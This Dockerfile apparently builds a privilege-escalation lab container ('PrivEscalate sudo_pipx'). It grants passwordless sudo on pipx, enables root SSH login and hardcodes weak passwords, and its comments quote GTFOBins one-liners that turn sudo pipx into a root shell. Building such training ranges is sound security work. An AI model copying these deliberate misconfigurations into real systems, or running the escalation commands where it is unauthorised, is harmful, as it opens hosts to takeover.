FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_pipx
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/pipx as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and pipx
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        pipx \
        python3 \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify pipx is installed
RUN which pipx && ls -la /usr/bin/pipx

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# pipx can be used to escalate privileges when run via sudo.
# GTFOBins documents that pipx can execute arbitrary code:
#   sudo pipx run ipython -- -c 'import os; os.execl("/bin/bash", "bash", "-p")'
# Or more directly:
#   TF=$(mktemp -d)
#   echo 'import os; os.execl("/bin/sh", "sh", "-c", "sh <$(tty) >$(tty) 2>$(tty)")' > $TF/setup.py
#   sudo pipx install --spec $TF x
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/pipx" > /etc/sudoers.d/pipx && \
    chmod 440 /etc/sudoers.d/pipx

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]